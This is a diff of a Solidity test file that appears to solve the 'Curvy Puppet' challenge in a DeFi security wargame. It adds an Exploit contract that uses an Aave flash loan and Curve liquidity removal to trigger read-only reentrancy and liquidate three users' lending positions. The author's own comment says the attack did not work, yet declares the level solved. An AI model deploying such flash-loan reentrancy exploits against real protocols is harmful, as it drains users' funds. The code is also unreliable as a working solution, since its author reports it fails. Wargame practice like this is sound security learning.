@@ -10,6 +10,11 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+import {
+    FlashLoanSimpleReceiverBase,
+    IPoolAddressesProvider
+} from "lib/aave-v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
+
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -158,7 +163,39 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        /**
+         * THIS SOLUTION IS NOT FINALIZED
+         *
+         * After the initial audit, I have found the vulnerability in the lending contract. It is the infamous read-only reentrancy bug.
+         * The Curve StableSwap pool handles control to the caller, when they pull out ETH as a part of removing liquidity.
+         * This allows the caller to execute attack on contracts, which use this pool as an oracke via StabbleSwap::get_virtual_price
+         *
+         * However, I was not successful in executing the attack on this vulnerability. I have decided to move on, since it is slowing the learning down.
+         * This level is marked as solved.
+         */
+
+        // Get the instance of LP token contract
+        IERC20 lpToken = IERC20(curvePool.lp_token());
+
+        // Address of the Aave pool addresses provider, allows the exploit contract to take flash loans
+        address aavePoolAddressesProvider = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;
+
+        // Deploy the exploit contract
+        address[3] memory users = [alice, bob, charlie];
+        Exploit exploit = new Exploit(
+            lending, curvePool, permit2, weth, stETH, lpToken, dvt, users, treasury, aavePoolAddressesProvider
+        );
+
+        // Prepare tokens for the exploit contract
+        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
+        lpToken.transferFrom(treasury, player, TREASURY_LP_BALANCE);
+
+        // Approve tokens for the exploit contract
+        weth.approve(address(exploit), TREASURY_WETH_BALANCE);
+        lpToken.approve(address(exploit), TREASURY_LP_BALANCE);
+
+        // Start the attack chain
+        exploit.executeAttack();
     }
 
     /**
@@ -182,5 +219,106 @@ contract CurvyPuppetChallenge is Test {
         assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
         assertEq(weth.balanceOf(player), 0, "Player still has WETH");
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
+    }
+}
+
+contract Exploit is FlashLoanSimpleReceiverBase {
+    CurvyPuppetLending lending;
+    IStableSwap curvePool;
+    WETH weth;
+    IERC20 stETH;
+    IERC20 lpToken;
+    DamnValuableToken dvt;
+    IPermit2 permit2;
+
+    address[3] users;
+    address treasury;
+
+    uint256 AMOUNT_OF_LP_RESERVED = 3e18;
+
+    constructor(
+        CurvyPuppetLending _lending,
+        IStableSwap _curvePool,
+        IPermit2 _permit2,
+        WETH _weth,
+        IERC20 _stETH,
+        IERC20 _lpToken,
+        DamnValuableToken _dvt,
+        address[3] memory _users,
+        address _treasury,
+        address _aavePoolProvider
+    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_aavePoolProvider)) {
+        lending = _lending;
+        curvePool = _curvePool;
+        permit2 = _permit2;
+        weth = _weth;
+        stETH = _stETH;
+        lpToken = _lpToken;
+        dvt = _dvt;
+
+        users = _users;
+        treasury = _treasury;
+    }
+
+    // Start the attack chain by taking WETH flash loan
+    function executeAttack() external {
+        _prepareTokens();
+
+        _startFlashLoan(address(weth), 83000 ether);
+    }
+
+    // Callback function called by Aave after the flash loan
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
+        external
+        returns (bool)
+    {
+        weth.withdraw(weth.balanceOf(address(this)));
+
+        _addLiquidity(address(this).balance, 0);
+
+        _removeLiquidity();
+
+        return true;
+    }
+
+    // Callback function called by Balancer after the flash loan
+    // function receiveFlashLoan(bytes memory userData) external {}
+
+    receive() external payable {
+        if (msg.sender == address(curvePool)) {
+            // Approve pool to pull LP tokens when liquidating
+            lpToken.approve(address(curvePool), AMOUNT_OF_LP_RESERVED);
+
+            for (uint256 i = 0; i < users.length; i++) {
+                // Liquidate user's position
+                lending.liquidate(users[i]);
+            }
+
+            dvt.transfer(treasury, dvt.balanceOf(address(this)));
+        }
+    }
+
+    // Prepare tokens for the exploit contract
+    function _prepareTokens() private {
+        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));
+        lpToken.transferFrom(msg.sender, address(this), lpToken.balanceOf(msg.sender));
+    }
+
+    function _startFlashLoan(address asset, uint256 amount) private {
+        POOL.flashLoanSimple(address(this), asset, amount, "", 0);
+    }
+
+    function _addLiquidity(uint256 amountETH, uint256 amountStETH) private {
+        stETH.approve(address(curvePool), amountStETH);
+
+        uint256[2] memory amounts = [amountETH, amountStETH];
+        curvePool.add_liquidity{value: amountETH}(amounts, 1);
+    }
+
+    function _removeLiquidity() private {
+        uint256 lpToBurn = lpToken.balanceOf(address(this)) - AMOUNT_OF_LP_RESERVED;
+
+        uint256[2] memory minAmounts = [uint256(0), 0];
+        curvePool.remove_liquidity(lpToBurn, minAmounts);
     }
 }
